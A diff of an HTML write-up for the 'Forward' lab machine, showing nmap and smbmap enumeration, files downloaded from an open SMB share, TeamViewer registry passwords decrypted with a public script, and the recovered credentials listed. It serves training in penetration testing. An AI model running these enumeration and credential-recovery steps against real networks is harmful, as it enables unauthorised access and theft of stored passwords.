@@ -30,11 +30,15 @@ layout: default
 
     <li>Running a port scan against the full port range to determine which ones are open.</li>
 
+    <br>
+    
     <pre>
 # Nmap 7.91 scan initiated Fri Oct  1 10:38:20 2021 as: nmap -p- -oN ping_tcp 192.168.90.157&#13;&#10;Nmap scan report for 192.168.90.157&#13;&#10;Host is up (0.041s latency).&#13;&#10;Not shown: 65531 closed ports&#13;&#10;PORT    STATE SERVICE&#13;&#10;22/tcp  open  ssh&#13;&#10;25/tcp  open  smtp&#13;&#10;139/tcp open  netbios-ssn&#13;&#10;445/tcp open  microsoft-ds&#13;&#10;&#13;&#10;# Nmap done at Fri Oct  1 10:39:02 2021 -- 1 IP address (1 host up) scanned in 42.04 seconds
     </pre>
 
     <li>Running an nmap scan using the flags -sV and -sC to enumerate service versions and other information.</li>
+
+    <br>
 
     <pre>
 # Nmap 7.91 scan initiated Fri Oct  1 10:39:23 2021 as: nmap -p22,25,139,445 -sV -sC -oN script_tcp 192.168.90.157&#13;&#10;Nmap scan report for 192.168.90.157&#13;&#10;Host is up (0.042s latency).&#13;&#10;&#13;&#10;PORT    STATE SERVICE     VERSION&#13;&#10;22/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)&#13;&#10;| ssh-hostkey: &#13;&#10;|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)&#13;&#10;|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)&#13;&#10;|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)&#13;&#10;25/tcp  open  smtp        Exim smtpd&#13;&#10;| smtp-commands: forward Hello nmap.scanme.org [192.168.49.90], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP, &#13;&#10;|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP &#13;&#10;139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)&#13;&#10;445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)&#13;&#10;Service Info: Host: FORWARD; OS: Linux; CPE: cpe:/o:linux:linux_kernel&#13;&#10;&#13;&#10;Host script results:&#13;&#10;|_clock-skew: mean: 1h20m01s, deviation: 2h18m35s, median: 0s&#13;&#10;| smb-os-discovery: &#13;&#10;|   OS: Windows 6.1 (Samba 4.9.5-Debian)&#13;&#10;|   Computer name: forward&#13;&#10;|   NetBIOS computer name: FORWARD\x00&#13;&#10;|   Domain name: \x00&#13;&#10;|   FQDN: forward&#13;&#10;|_  System time: 2021-10-01T10:39:45-04:00&#13;&#10;| smb-security-mode: &#13;&#10;|   account_used: guest&#13;&#10;|   authentication_level: user&#13;&#10;|   challenge_response: supported&#13;&#10;|_  message_signing: disabled (dangerous, but default)&#13;&#10;| smb2-security-mode: &#13;&#10;|   2.02: &#13;&#10;|_    Message signing enabled but not required&#13;&#10;| smb2-time: &#13;&#10;|   date: 2021-10-01T14:39:43&#13;&#10;|_  start_date: N/A&#13;&#10;&#13;&#10;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&#13;&#10;# Nmap done at Fri Oct  1 10:40:19 2021 -- 1 IP address (1 host up) scanned in 55.93 seconds
@@ -45,11 +49,15 @@ layout: default
     
     <li>I start off with checking for SMB access.</li>
 
+    <br>
+
     <pre>
 &boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/ProvingGrounds/Forward]&#13;&#10;&boxur;&HorizontalLine;$ smbmap -H 192.168.90.157   &#13;&#10;[+] IP: 192.168.90.157:445&#9;Name: 192.168.90.157                                    &#13;&#10;        Disk                                                  &#9;Permissions&#9;Comment&#13;&#10;&#9;----                                                  &#9;-----------&#9;-------&#13;&#10;&#9;utils                                             &#9;READ ONLY&#9;Utilities&#13;&#10;&#9;print$                                            &#9;NO ACCESS&#9;Printer Drivers&#13;&#10;&#9;IPC$                                              &#9;NO ACCESS&#9;IPC Service (Samba 4.9.5-Debian)
     </pre>
     
     <li>It appears we have access to the share "utils" so I check what is inside.</li>
+
+    <br>
 
     <pre>
 ┌──(kali㉿kali)-[~/Documents/ProvingGrounds/Forward]
@@ -73,17 +81,23 @@ smb: \> ls
 
     <li>It appears there are some interesting files.  I download them.</li>
 
+    <br>
+
     <pre>
 smb: \&gt; mget *&#13;&#10;getting file \fox.reg of size 10634 as fox.reg (62.2 KiloBytes/sec) (average 62.2 KiloBytes/sec)&#13;&#10;getting file \TeamViewer_Setup_v7.exe of size 5024832 as TeamViewer_Setup_v7.exe (3021.6 KiloBytes/sec) (average 2745.6 KiloBytes/sec)&#13;&#10;getting file \mara.reg of size 10408 as mara.reg (65.2 KiloBytes/sec) (average 2530.9 KiloBytes/sec)&#13;&#10;getting file \vale.reg of size 10206 as vale.reg (63.9 KiloBytes/sec) (average 2347.9 KiloBytes/sec)&#13;&#10;getting file \golemitratigunda.reg of size 10206 as golemitratigunda.reg (62.3 KiloBytes/sec) (average 2186.3 KiloBytes/sec)&#13;&#10;getting file \alberobello.reg of size 10206 as alberobello.reg (61.5 KiloBytes/sec) (average 2044.3 KiloBytes/sec)&#13;&#10;getting file \giammy.reg of size 10312 as giammy.reg (65.0 KiloBytes/sec) (average 1925.4 KiloBytes/sec)&#13;&#10;getting file \README.all of size 165 as README.all (1.1 KiloBytes/sec) (average 1817.7 KiloBytes/sec)
     </pre>
 
     <li>The readme states that there should be encrypted passwords in the .reg files.</li>
 
+    <br>
+
     <pre>
 &boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/ProvingGrounds/Forward/Exfiltrated]&#13;&#10;&boxur;&HorizontalLine;$ cat README.all     &#13;&#10;each of you has to install TeamViewer and then import your own registry key for automatic configuration.&#13;&#10;Don&apos;t worry about the password, it&apos;s well encrypted!&#13;&#10;&#13;&#10;Root!
     </pre>
 
     <li>I check the .reg files and I see the variable "SecurityPasswordAES" in each of them, which looks promising.  I used google and searched for "decrypt teamviewer password registry".  The top result was https://gist.github.com/rishdang/442d355180e5c69e0fcb73fecd05d7e0.  So I downloaded the script and gave it a try.</li>
+
+    <br>
 
     <pre>
 ┌──(kali㉿kali)-[~/Documents/ProvingGrounds/Forward/Exfiltrated]
@@ -139,7 +153,7 @@ Decrypted password is :  iparalipomenidellabatracomiomachia
     <li>I did the above for each .reg file and ended up with:</li>
 
     <br>
-    
+
     <pre>
 fox:iparalipomenidellabatracomiomachia
 alberobello:alberobello
